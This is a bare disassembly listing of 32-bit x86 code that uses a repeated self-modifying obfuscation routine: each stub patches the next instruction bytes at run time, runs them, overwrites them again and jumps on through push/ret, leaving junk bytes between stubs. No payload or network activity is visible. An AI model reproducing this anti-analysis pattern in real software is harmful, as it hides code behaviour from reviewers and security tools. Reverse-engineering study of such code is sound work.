  40a1df:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40a1e5:	8d 80 b2 26 d4 00    	lea    0xd426b2(%eax),%eax
  40a1eb:	87 05 f4 a1 40 00    	xchg   %eax,0x40a1f4
  40a1f1:	58                   	pop    %eax
  40a1f2:	f3 90                	pause
  40a1f4:	2c 39                	sub    $0x39,%al
  40a1f6:	07                   	pop    %es
  40a1f7:	6a 00                	push   $0x0
  40a1f9:	00 00                	add    %al,(%eax)
  40a1fb:	50                   	push   %eax
  40a1fc:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40a200:	66 87 05 f4 a1 40 00 	xchg   %ax,0x40a1f4
  40a207:	b8 8d ed 25 23       	mov    $0x2325ed8d,%eax
  40a20c:	8d 40 02             	lea    0x2(%eax),%eax
  40a20f:	87 04 24             	xchg   %eax,(%esp)
  40a212:	c3                   	ret
  40a213:	8f 05 43 a2 40 00    	pop    0x40a243
  40a219:	50                   	push   %eax
  40a21a:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40a220:	8d 80 b2 26 cc ff    	lea    -0x33d94e(%eax),%eax
  40a226:	87 05 2f a2 40 00    	xchg   %eax,0x40a22f
  40a22c:	58                   	pop    %eax
  40a22d:	f3 90                	pause
  40a22f:	9b                   	fwait
  40a230:	55                   	push   %ebp
  40a231:	91                   	xchg   %eax,%ecx
  40a232:	cf                   	iret
  40a233:	00 00                	add    %al,(%eax)
  40a235:	00 50 66             	add    %dl,0x66(%eax)
  40a238:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40a23d:	05 2f a2 40 00       	add    $0x40a22f,%eax
  40a242:	b8 04 76 e5 75       	mov    $0x75e57604,%eax
  40a247:	8d 40 02             	lea    0x2(%eax),%eax
  40a24a:	87 04 24             	xchg   %eax,(%esp)
  40a24d:	c3                   	ret
  40a24e:	8f 05 7d a2 40 00    	pop    0x40a27d
  40a254:	50                   	push   %eax
  40a255:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40a25b:	8d 80 76 f5 87 56    	lea    0x5687f576(%eax),%eax
  40a261:	87 05 6a a2 40 00    	xchg   %eax,0x40a26a
  40a267:	58                   	pop    %eax
  40a268:	f3 90                	pause
  40a26a:	de 51 77             	ficoms 0x77(%ecx)
  40a26d:	37                   	aaa
  40a26e:	40                   	inc    %eax
  40a26f:	00 50 66             	add    %dl,0x66(%eax)
  40a272:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40a277:	05 6a a2 40 00       	add    $0x40a26a,%eax
  40a27c:	b8 51 cd 3e e9       	mov    $0xe93ecd51,%eax
  40a281:	8d 40 01             	lea    0x1(%eax),%eax
  40a284:	87 04 24             	xchg   %eax,(%esp)
  40a287:	c3                   	ret
  40a288:	8f 05 b7 a2 40 00    	pop    0x40a2b7
  40a28e:	50                   	push   %eax
  40a28f:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40a295:	8d 80 ea 15 34 57    	lea    0x573415ea(%eax),%eax
  40a29b:	87 05 a4 a2 40 00    	xchg   %eax,0x40a2a4
  40a2a1:	58                   	pop    %eax
  40a2a2:	f3 90                	pause
  40a2a4:	93                   	xchg   %eax,%ebx
  40a2a5:	23 5c e1 40          	and    0x40(%ecx,%eiz,8),%ebx
  40a2a9:	00 50 66             	add    %dl,0x66(%eax)
  40a2ac:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40a2b1:	05 a4 a2 40 00       	add    $0x40a2a4,%eax
  40a2b6:	b8 19 ec b2 90       	mov    $0x90b2ec19,%eax
  40a2bb:	8d 40 01             	lea    0x1(%eax),%eax
  40a2be:	87 04 24             	xchg   %eax,(%esp)
  40a2c1:	c3                   	ret
  40a2c2:	8f 05 f0 a2 40 00    	pop    0x40a2f0
  40a2c8:	50                   	push   %eax
  40a2c9:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40a2cf:	8d 80 d3 dd 53 ff    	lea    -0xac222d(%eax),%eax
  40a2d5:	87 05 de a2 40 00    	xchg   %eax,0x40a2de
  40a2db:	58                   	pop    %eax
  40a2dc:	f3 90                	pause
  40a2de:	6e                   	outsb  %ds:(%esi),(%dx)
  40a2df:	bb 87 37 ff 50       	mov    $0x50ff3787,%ebx
  40a2e4:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40a2e8:	66 87 05 de a2 40 00 	xchg   %ax,0x40a2de
  40a2ef:	b8 54 1f db 81       	mov    $0x81db1f54,%eax
  40a2f4:	87 04 24             	xchg   %eax,(%esp)
  40a2f7:	c3                   	ret
  40a2f8:	8f 05 26 a3 40 00    	pop    0x40a326
  40a2fe:	50                   	push   %eax
  40a2ff:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40a305:	8d 80 8c 54 10 40    	lea    0x4010548c(%eax),%eax
  40a30b:	87 05 14 a3 40 00    	xchg   %eax,0x40a314
  40a311:	58                   	pop    %eax
  40a312:	f3 90                	pause
  40a314:	0b 1d c7 1a 00 50    	or     0x50001ac7,%ebx
  40a31a:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40a31e:	66 87 05 14 a3 40 00 	xchg   %ax,0x40a314
  40a325:	b8 d6 e4 b8 33       	mov    $0x33b8e4d6,%eax
  40a32a:	87 04 24             	xchg   %eax,(%esp)
  40a32d:	c3                   	ret
  40a32e:	8f 05 5d a3 40 00    	pop    0x40a35d
  40a334:	50                   	push   %eax
  40a335:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40a33b:	8d 80 ee e4 33 57    	lea    0x5733e4ee(%eax),%eax
  40a341:	87 05 4a a3 40 00    	xchg   %eax,0x40a34a
  40a347:	58                   	pop    %eax
  40a348:	f3 90                	pause
  40a34a:	31 04 86             	xor    %eax,(%esi,%eax,4)
  40a34d:	04 40                	add    $0x40,%al
  40a34f:	00 50 66             	add    %dl,0x66(%eax)
  40a352:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40a357:	05 4a a3 40 00       	add    $0x40a34a,%eax
  40a35c:	b8 60 3e 43 47       	mov    $0x47433e60,%eax
  40a361:	8d 40 01             	lea    0x1(%eax),%eax
  40a364:	87 04 24             	xchg   %eax,(%esp)
  40a367:	c3                   	ret
  40a368:	8f 05 96 a3 40 00    	pop    0x40a396
  40a36e:	50                   	push   %eax
  40a36f:	90                   	nop
  40a370:	b8 15 20 40 00       	mov    $0x402015,%eax
  40a375:	8d 80 d3 d1 55 ff    	lea    -0xaa2e2d(%eax),%eax
  40a37b:	87 05 84 a3 40 00    	xchg   %eax,0x40a384
  40a381:	58                   	pop    %eax
  40a382:	f3 90                	pause
  40a384:	0a fa                	or     %dl,%bh
  40a386:	91                   	xchg   %eax,%ecx
  40a387:	c7                   	(bad)
  40a388:	ff 50 66             	call   *0x66(%eax)
  40a38b:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40a390:	05 84 a3 40 00       	add    $0x40a384,%eax
  40a395:	b8 b0 5b 3a 2e       	mov    $0x2e3a5bb0,%eax
  40a39a:	87 04 24             	xchg   %eax,(%esp)
  40a39d:	c3                   	ret
  40a39e:	8f 05 cd a3 40 00    	pop    0x40a3cd
  40a3a4:	50                   	push   %eax
  40a3a5:	90                   	nop
  40a3a6:	b8 15 20 40 00       	mov    $0x402015,%eax
  40a3ab:	8d 80 76 ed 33 57    	lea    0x5733ed76(%eax),%eax
  40a3b1:	87 05 ba a3 40 00    	xchg   %eax,0x40a3ba
  40a3b7:	58                   	pop    %eax
  40a3b8:	f3 90                	pause
  40a3ba:	23 00                	and    (%eax),%eax
  40a3bc:	1f                   	pop    %ds
  40a3bd:	90                   	nop
  40a3be:	40                   	inc    %eax
  40a3bf:	00 50 66             	add    %dl,0x66(%eax)
  40a3c2:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40a3c7:	05 ba a3 40 00       	add    $0x40a3ba,%eax
  40a3cc:	b8 84 53 81 18       	mov    $0x18815384,%eax
  40a3d1:	8d 40 01             	lea    0x1(%eax),%eax
  40a3d4:	87 04 24             	xchg   %eax,(%esp)
  40a3d7:	c3                   	ret
  40a3d8:	8f 05 06 a4 40 00    	pop    0x40a406
  40a3de:	50                   	push   %eax
  40a3df:	90                   	nop
  40a3e0:	b8 15 20 40 00       	mov    $0x402015,%eax
  40a3e5:	8d 80 d3 57 54 ff    	lea    -0xaba82d(%eax),%eax
  40a3eb:	87 05 f4 a3 40 00    	xchg   %eax,0x40a3f4
  40a3f1:	58                   	pop    %eax
  40a3f2:	f3 90                	pause
  40a3f4:	93                   	xchg   %eax,%ebx
  40a3f5:	0d 50 9f ff 50       	or     $0x50ff9f50,%eax
  40a3fa:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40a3fe:	66 87 05 f4 a3 40 00 	xchg   %ax,0x40a3f4
  40a405:	b8 db 75 13 27       	mov    $0x271375db,%eax
  40a40a:	87 04 24             	xchg   %eax,(%esp)
  40a40d:	c3                   	ret
  40a40e:	8f 05 3c a4 40 00    	pop    0x40a43c
  40a414:	50                   	push   %eax
  40a415:	90                   	nop
  40a416:	b8 15 20 40 00       	mov    $0x402015,%eax
  40a41b:	8d 80 d3 c1 54 ff    	lea    -0xab3e2d(%eax),%eax
  40a421:	87 05 2a a4 40 00    	xchg   %eax,0x40a42a
  40a427:	58                   	pop    %eax
  40a428:	f3 90                	pause
  40a42a:	39 f5                	cmp    %esi,%ebp
  40a42c:	49                   	dec    %ecx
  40a42d:	e2 ff                	loop   0x40a42e
  40a42f:	50                   	push   %eax
  40a430:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40a434:	66 87 05 2a a4 40 00 	xchg   %ax,0x40a42a
  40a43b:	b8 cb 16 1c 89       	mov    $0x891c16cb,%eax
  40a440:	87 04 24             	xchg   %eax,(%esp)
  40a443:	c3                   	ret
  40a444:	8f 05 72 a4 40 00    	pop    0x40a472
  40a44a:	50                   	push   %eax
  40a44b:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40a451:	8d 80 d3 ab 51 ff    	lea    -0xae542d(%eax),%eax
  40a457:	87 05 60 a4 40 00    	xchg   %eax,0x40a460
  40a45d:	58                   	pop    %eax
  40a45e:	f3 90                	pause
  40a460:	ac                   	lods   %ds:(%esi),%al
  40a461:	08 68 9f             	or     %ch,-0x61(%eax)
  40a464:	ff 50 66             	call   *0x66(%eax)
  40a467:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40a46c:	05 60 a4 40 00       	add    $0x40a460,%eax
  40a471:	b8 a5 1a fe 3d       	mov    $0x3dfe1aa5,%eax
  40a476:	87 04 24             	xchg   %eax,(%esp)
  40a479:	c3                   	ret
  40a47a:	8f 05 a8 a4 40 00    	pop    0x40a4a8
  40a480:	50                   	push   %eax
  40a481:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40a487:	8d 80 d3 45 3d ff    	lea    -0xc2ba2d(%eax),%eax
  40a48d:	87 05 96 a4 40 00    	xchg   %eax,0x40a496
  40a493:	58                   	pop    %eax
  40a494:	f3 90                	pause
  40a496:	4f                   	dec    %edi
  40a497:	7f 92                	jg     0x40a42b
  40a499:	65 ff 50 66          	call   *%gs:0x66(%eax)
  40a49d:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40a4a2:	05 96 a4 40 00       	add    $0x40a496,%eax
  40a4a7:	b8 5d 3e 60 97       	mov    $0x97603e5d,%eax
  40a4ac:	87 04 24             	xchg   %eax,(%esp)
  40a4af:	c3                   	ret
  40a4b0:	8f 05 de a4 40 00    	pop    0x40a4de
  40a4b6:	50                   	push   %eax
  40a4b7:	90                   	nop
  40a4b8:	b8 15 20 40 00       	mov    $0x402015,%eax
  40a4bd:	8d 80 a3 e1 bf ff    	lea    -0x401e5d(%eax),%eax
  40a4c3:	87 05 cc a4 40 00    	xchg   %eax,0x40a4cc
  40a4c9:	58                   	pop    %eax
  40a4ca:	f3 90                	pause
  40a4cc:	23 60 11             	and    0x11(%eax),%esp
  40a4cf:	f1                   	int1
  40a4d0:	00 50 66             	add    %dl,0x66(%eax)
  40a4d3:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40a4d8:	05 cc a4 40 00       	add    $0x40a4cc,%eax
  40a4dd:	b8 0b 16 63 61       	mov    $0x6163160b,%eax
  40a4e2:	87 04 24             	xchg   %eax,(%esp)
  40a4e5:	c3                   	ret
  40a4e6:	8f 05 14 a5 40 00    	pop    0x40a514
  40a4ec:	50                   	push   %eax
  40a4ed:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40a4f3:	8d 80 a4 e0 ff 3f    	lea    0x3fffe0a4(%eax),%eax
  40a4f9:	87 05 02 a5 40 00    	xchg   %eax,0x40a502
  40a4ff:	58                   	pop    %eax
  40a500:	f3 90                	pause
  40a502:	f9                   	stc
  40a503:	f6 a4 56 00 50 66 b8 	mulb   -0x4799b000(%esi,%edx,2)
  40a50a:	eb e8                	jmp    0x40a4f4
  40a50c:	66 87 05 02 a5 40 00 	xchg   %ax,0x40a502
  40a513:	b8 7d 8a 41 37       	mov    $0x37418a7d,%eax
  40a518:	87 04 24             	xchg   %eax,(%esp)
  40a51b:	c3                   	ret
  40a51c:	8f 05 4b a5 40 00    	pop    0x40a54b
  40a522:	50                   	push   %eax
  40a523:	90                   	nop
  40a524:	b8 15 20 40 00       	mov    $0x402015,%eax
  40a529:	8d 80 78 7b c0 ff    	lea    -0x3f8488(%eax),%eax
  40a52f:	87 05 38 a5 40 00    	xchg   %eax,0x40a538
  40a535:	58                   	pop    %eax
  40a536:	f3 90                	pause
  40a538:	c1 20 22             	shll   $0x22,(%eax)
  40a53b:	71 00                	jno    0x40a53d
  40a53d:	00 50 66             	add    %dl,0x66(%eax)
  40a540:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40a545:	05 38 a5 40 00       	add    $0x40a538,%eax
  40a54a:	b8 fd 03 6f 66       	mov    $0x666f03fd,%eax
  40a54f:	8d 40 01             	lea    0x1(%eax),%eax
  40a552:	87 04 24             	xchg   %eax,(%esp)
  40a555:	c3                   	ret
  40a556:	8f 05 84 a5 40 00    	pop    0x40a584
  40a55c:	50                   	push   %eax
  40a55d:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40a563:	8d 80 a3 e0 ff 3f    	lea    0x3fffe0a3(%eax),%eax
  40a569:	87 05 72 a5 40 00    	xchg   %eax,0x40a572
  40a56f:	58                   	pop    %eax
  40a570:	f3 90                	pause
  40a572:	01 1b                	add    %ebx,(%ebx)
  40a574:	2b cf                	sub    %edi,%ecx
  40a576:	00 50 66             	add    %dl,0x66(%eax)
  40a579:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40a57e:	05 72 a5 40 00       	add    $0x40a572,%eax
  40a583:	b8 d0 02 3a 1d       	mov    $0x1d3a02d0,%eax
  40a588:	87 04 24             	xchg   %eax,(%esp)
  40a58b:	c3                   	ret
  40a58c:	8f 05 ba a5 40 00    	pop    0x40a5ba
  40a592:	50                   	push   %eax
  40a593:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40a599:	8d 80 a3 e1 bf ff    	lea    -0x401e5d(%eax),%eax
  40a59f:	87 05 a8 a5 40 00    	xchg   %eax,0x40a5a8
  40a5a5:	58                   	pop    %eax
  40a5a6:	f3 90                	pause
  40a5a8:	5d                   	pop    %ebp
  40a5a9:	6d                   	insl   (%dx),%es:(%edi)
  40a5aa:	c7                   	(bad)
  40a5ab:	08 00                	or     %al,(%eax)
  40a5ad:	50                   	push   %eax
  40a5ae:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40a5b2:	66 87 05 a8 a5 40 00 	xchg   %ax,0x40a5a8
  40a5b9:	b8 a4 d0 b1 d0       	mov    $0xd0b1d0a4,%eax
  40a5be:	87 04 24             	xchg   %eax,(%esp)
  40a5c1:	c3                   	ret
  40a5c2:	8f 05 f1 a5 40 00    	pop    0x40a5f1
  40a5c8:	50                   	push   %eax
  40a5c9:	90                   	nop
  40a5ca:	b8 15 20 40 00       	mov    $0x402015,%eax
  40a5cf:	8d 80 fa 63 cf 70    	lea    0x70cf63fa(%eax),%eax
  40a5d5:	87 05 de a5 40 00    	xchg   %eax,0x40a5de
  40a5db:	58                   	pop    %eax
  40a5dc:	f3 90                	pause
  40a5de:	2d 44 eb 22 ff       	sub    $0xff22eb44,%eax
  40a5e3:	ff 50 66             	call   *0x66(%eax)
  40a5e6:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40a5eb:	05 de a5 40 00       	add    $0x40a5de,%eax
  40a5f0:	b8 88 a9 15 58       	mov    $0x5815a988,%eax
  40a5f5:	8d 40 01             	lea    0x1(%eax),%eax
  40a5f8:	87 04 24             	xchg   %eax,(%esp)
  40a5fb:	c3                   	ret
  40a5fc:	8f 05 2b a6 40 00    	pop    0x40a62b
  40a602:	50                   	push   %eax
  40a603:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40a609:	8d 80 fa 64 95 70    	lea    0x709564fa(%eax),%eax
  40a60f:	87 05 18 a6 40 00    	xchg   %eax,0x40a618
  40a615:	58                   	pop    %eax
  40a616:	f3 90                	pause
  40a618:	08 dd                	or     %bl,%ch
  40a61a:	65 a5                	movsl  %gs:(%esi),%es:(%edi)
  40a61c:	ff                   	(bad)
  40a61d:	ff 50 66             	call   *0x66(%eax)
  40a620:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40a625:	05 18 a6 40 00       	add    $0x40a618,%eax
  40a62a:	b8 e4 91 2e 59       	mov    $0x592e91e4,%eax
  40a62f:	8d 40 01             	lea    0x1(%eax),%eax
  40a632:	87 04 24             	xchg   %eax,(%esp)
  40a635:	c3                   	ret
  40a636:	8f 05 64 a6 40 00    	pop    0x40a664
  40a63c:	50                   	push   %eax
  40a63d:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40a643:	8d 80 6e 34 e4 03    	lea    0x3e4346e(%eax),%eax
  40a649:	87 05 52 a6 40 00    	xchg   %eax,0x40a652
  40a64f:	58                   	pop    %eax
  40a650:	f3 90                	pause
  40a652:	d5 ae                	aad    $0xae
  40a654:	ab                   	stos   %eax,%es:(%edi)
  40a655:	8a 00                	mov    (%eax),%al
  40a657:	50                   	push   %eax
  40a658:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40a65c:	66 87 05 52 a6 40 00 	xchg   %ax,0x40a652
  40a663:	b8 e5 69 72 0a       	mov    $0xa7269e5,%eax
  40a668:	87 04 24             	xchg   %eax,(%esp)
  40a66b:	c3                   	ret
  40a66c:	8f 05 9a a6 40 00    	pop    0x40a69a
  40a672:	50                   	push   %eax
  40a673:	90                   	nop
  40a674:	b8 15 20 40 00       	mov    $0x402015,%eax
  40a679:	8d 80 a3 e1 bf ff    	lea    -0x401e5d(%eax),%eax
  40a67f:	87 05 88 a6 40 00    	xchg   %eax,0x40a688
  40a685:	58                   	pop    %eax
  40a686:	f3 90                	pause
  40a688:	03 bc 14 71 00 50 66 	add    0x66500071(%esp,%edx,1),%edi
  40a68f:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40a694:	05 88 a6 40 00       	add    $0x40a688,%eax
  40a699:	b8 6e 13 02 91       	mov    $0x9102136e,%eax
  40a69e:	87 04 24             	xchg   %eax,(%esp)
  40a6a1:	c3                   	ret
  40a6a2:	8f 05 d1 a6 40 00    	pop    0x40a6d1
  40a6a8:	50                   	push   %eax
  40a6a9:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40a6af:	8d 80 fa 63 e7 6f    	lea    0x6fe763fa(%eax),%eax
  40a6b5:	87 05 be a6 40 00    	xchg   %eax,0x40a6be
  40a6bb:	58                   	pop    %eax
  40a6bc:	f3 90                	pause
  40a6be:	59                   	pop    %ecx
  40a6bf:	42                   	inc    %edx
  40a6c0:	6d                   	insl   (%dx),%es:(%edi)
  40a6c1:	2e ff                	cs (bad)
  40a6c3:	ff 50 66             	call   *0x66(%eax)
  40a6c6:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40a6cb:	05 be a6 40 00       	add    $0x40a6be,%eax
  40a6d0:	b8 57 1e 10 57       	mov    $0x57101e57,%eax
  40a6d5:	8d 40 01             	lea    0x1(%eax),%eax
  40a6d8:	87 04 24             	xchg   %eax,(%esp)
  40a6db:	c3                   	ret
  40a6dc:	8f 05 0d a7 40 00    	pop    0x40a70d
  40a6e2:	50                   	push   %eax
  40a6e3:	90                   	nop
  40a6e4:	b8 15 20 40 00       	mov    $0x402015,%eax
  40a6e9:	8d 80 b2 24 e4 13    	lea    0x13e424b2(%eax),%eax
  40a6ef:	87 05 f8 a6 40 00    	xchg   %eax,0x40a6f8
  40a6f5:	58                   	pop    %eax
  40a6f6:	f3 90                	pause
  40a6f8:	d5 d0                	aad    $0xd0
  40a6fa:	4d                   	dec    %ebp
  40a6fb:	38 01                	cmp    %al,(%ecx)
  40a6fd:	00 00                	add    %al,(%eax)
  40a6ff:	00 50 66             	add    %dl,0x66(%eax)
  40a702:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40a707:	05 f8 a6 40 00       	add    $0x40a6f8,%eax
  40a70c:	b8 ab f9 8c 0c       	mov    $0xc8cf9ab,%eax
  40a711:	8d 40 03             	lea    0x3(%eax),%eax
  40a714:	87 04 24             	xchg   %eax,(%esp)
  40a717:	c3                   	ret
  40a718:	8f 05 46 a7 40 00    	pop    0x40a746
  40a71e:	50                   	push   %eax
  40a71f:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40a725:	8d 80 d3 87 3a ff    	lea    -0xc5782d(%eax),%eax
  40a72b:	87 05 34 a7 40 00    	xchg   %eax,0x40a734
  40a731:	58                   	pop    %eax
  40a732:	f3 90                	pause
  40a734:	8c 46 66             	mov    %es,0x66(%esi)
  40a737:	92                   	xchg   %eax,%edx
  40a738:	ff 50 66             	call   *0x66(%eax)
  40a73b:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40a740:	05 34 a7 40 00       	add    $0x40a734,%eax
  40a745:	b8 95 0a 3d 5b       	mov    $0x5b3d0a95,%eax
  40a74a:	87 04 24             	xchg   %eax,(%esp)
  40a74d:	c3                   	ret
  40a74e:	8f 05 7c a7 40 00    	pop    0x40a77c
  40a754:	50                   	push   %eax
  40a755:	90                   	nop
  40a756:	b8 15 20 40 00       	mov    $0x402015,%eax
  40a75b:	8d 80 8c 58 17 40    	lea    0x4017588c(%eax),%eax
  40a761:	87 05 6a a7 40 00    	xchg   %eax,0x40a76a
  40a767:	58                   	pop    %eax
  40a768:	f3 90                	pause
  40a76a:	7d b3                	jge    0x40a71f
  40a76c:	dd 6f 00             	(bad) 0x0(%edi)
  40a76f:	50                   	push   %eax
  40a770:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40a774:	66 87 05 6a a7 40 00 	xchg   %ax,0x40a76a
  40a77b:	b8 3f 8d ad a0       	mov    $0xa0ad8d3f,%eax
  40a780:	87 04 24             	xchg   %eax,(%esp)
  40a783:	c3                   	ret
  40a784:	8f 05 b3 a7 40 00    	pop    0x40a7b3
  40a78a:	50                   	push   %eax
  40a78b:	90                   	nop
  40a78c:	b8 15 20 40 00       	mov    $0x402015,%eax
  40a791:	8d 80 ea f5 03 52    	lea    0x5203f5ea(%eax),%eax
  40a797:	87 05 a0 a7 40 00    	xchg   %eax,0x40a7a0
  40a79d:	58                   	pop    %eax
  40a79e:	f3 90                	pause
  40a7a0:	31 7a 60             	xor    %edi,0x60(%edx)
  40a7a3:	de 40 00             	fiadds 0x0(%eax)
  40a7a6:	50                   	push   %eax
  40a7a7:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40a7ab:	66 87 05 a0 a7 40 00 	xchg   %ax,0x40a7a0
  40a7b2:	b8 37 58 ba af       	mov    $0xafba5837,%eax
  40a7b7:	8d 40 01             	lea    0x1(%eax),%eax
  40a7ba:	87 04 24             	xchg   %eax,(%esp)
  40a7bd:	c3                   	ret
  40a7be:	8f 05 ec a7 40 00    	pop    0x40a7ec
  40a7c4:	50                   	push   %eax
  40a7c5:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40a7cb:	8d 80 d3 31 3d ff    	lea    -0xc2ce2d(%eax),%eax
  40a7d1:	87 05 da a7 40 00    	xchg   %eax,0x40a7da
  40a7d7:	58                   	pop    %eax
  40a7d8:	f3 90                	pause
  40a7da:	31 47 85             	xor    %eax,-0x7b(%edi)
  40a7dd:	fb                   	sti
  40a7de:	ff 50 66             	call   *0x66(%eax)
  40a7e1:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40a7e6:	05 da a7 40 00       	add    $0x40a7da,%eax
  40a7eb:	b8 29 aa 3b 01       	mov    $0x13baa29,%eax
  40a7f0:	87 04 24             	xchg   %eax,(%esp)
  40a7f3:	c3                   	ret
  40a7f4:	8f 05 23 a8 40 00    	pop    0x40a823
  40a7fa:	50                   	push   %eax
  40a7fb:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40a801:	8d 80 76 f5 83 56    	lea    0x5683f576(%eax),%eax
  40a807:	87 05 10 a8 40 00    	xchg   %eax,0x40a810
  40a80d:	58                   	pop    %eax
  40a80e:	f3 90                	pause
  40a810:	03 ce                	add    %esi,%ecx
  40a812:	d4 be                	aam    $0xbe
  40a814:	40                   	inc    %eax
  40a815:	00 50 66             	add    %dl,0x66(%eax)
  40a818:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40a81d:	05 10 a8 40 00       	add    $0x40a810,%eax
  40a822:	b8 7a bc d5 1b       	mov    $0x1bd5bc7a,%eax
  40a827:	8d 40 01             	lea    0x1(%eax),%eax
  40a82a:	87 04 24             	xchg   %eax,(%esp)
  40a82d:	c3                   	ret
  40a82e:	8f 05 5d a8 40 00    	pop    0x40a85d
  40a834:	50                   	push   %eax
  40a835:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40a83b:	8d 80 ea 15 34 57    	lea    0x573415ea(%eax),%eax
  40a841:	87 05 4a a8 40 00    	xchg   %eax,0x40a84a
  40a847:	58                   	pop    %eax
  40a848:	f3 90                	pause
  40a84a:	8c c9                	mov    %cs,%ecx
  40a84c:	d2 e6                	shl    %cl,%dh
  40a84e:	40                   	inc    %eax
  40a84f:	00 50 66             	add    %dl,0x66(%eax)
  40a852:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40a857:	05 4a a8 40 00       	add    $0x40a84a,%eax
  40a85c:	b8 71 f3 8e cd       	mov    $0xcd8ef371,%eax
  40a861:	8d 40 01             	lea    0x1(%eax),%eax
  40a864:	87 04 24             	xchg   %eax,(%esp)
  40a867:	c3                   	ret
  40a868:	8f 05 96 a8 40 00    	pop    0x40a896
  40a86e:	50                   	push   %eax
  40a86f:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40a875:	8d 80 d3 37 4e ff    	lea    -0xb1c82d(%eax),%eax
  40a87b:	87 05 84 a8 40 00    	xchg   %eax,0x40a884
  40a881:	58                   	pop    %eax
  40a882:	f3 90                	pause
  40a884:	84 4a 07             	test   %cl,0x7(%edx)
  40a887:	56                   	push   %esi
  40a888:	ff 50 66             	call   *0x66(%eax)
  40a88b:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40a890:	05 84 a8 40 00       	add    $0x40a884,%eax
  40a895:	b8 9d cd d7 9f       	mov    $0x9fd7cd9d,%eax
  40a89a:	87 04 24             	xchg   %eax,(%esp)
  40a89d:	c3                   	ret
  40a89e:	8f 05 cd a8 40 00    	pop    0x40a8cd
  40a8a4:	50                   	push   %eax
  40a8a5:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40a8ab:	8d 80 ea 15 34 57    	lea    0x573415ea(%eax),%eax
  40a8b1:	87 05 ba a8 40 00    	xchg   %eax,0x40a8ba
  40a8b7:	58                   	pop    %eax
  40a8b8:	f3 90                	pause
  40a8ba:	5d                   	pop    %ebp
  40a8bb:	1a b7 53 40 00 50    	sbb    0x50004053(%edi),%dh
  40a8c1:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40a8c5:	66 87 05 ba a8 40 00 	xchg   %ax,0x40a8ba
  40a8cc:	b8 98 15 7c a0       	mov    $0xa07c1598,%eax
  40a8d1:	8d 40 01             	lea    0x1(%eax),%eax
  40a8d4:	87 04 24             	xchg   %eax,(%esp)
  40a8d7:	c3                   	ret
  40a8d8:	8f 05 06 a9 40 00    	pop    0x40a906
  40a8de:	50                   	push   %eax
  40a8df:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40a8e5:	8d 80 53 e7 bf ff    	lea    -0x4018ad(%eax),%eax
  40a8eb:	87 05 f4 a8 40 00    	xchg   %eax,0x40a8f4
  40a8f1:	58                   	pop    %eax
  40a8f2:	f3 90                	pause
  40a8f4:	4f                   	dec    %edi
  40a8f5:	b8 ee 30 00 50       	mov    $0x500030ee,%eax
  40a8fa:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40a8fe:	66 87 05 f4 a8 40 00 	xchg   %ax,0x40a8f4
  40a905:	b8 3e 6a 1f 80       	mov    $0x801f6a3e,%eax
  40a90a:	87 04 24             	xchg   %eax,(%esp)
  40a90d:	c3                   	ret
  40a90e:	8f 05 3c a9 40 00    	pop    0x40a93c
  40a914:	50                   	push   %eax
  40a915:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40a91b:	8d 80 d3 b6 2a ff    	lea    -0xd5492d(%eax),%eax
  40a921:	87 05 2a a9 40 00    	xchg   %eax,0x40a92a
  40a927:	58                   	pop    %eax
  40a928:	f3 90                	pause
  40a92a:	8c 77 d0             	mov    %?,-0x30(%edi)
  40a92d:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40a92e:	ff 50 66             	call   *0x66(%eax)
  40a931:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40a936:	05 2a a9 40 00       	add    $0x40a92a,%eax
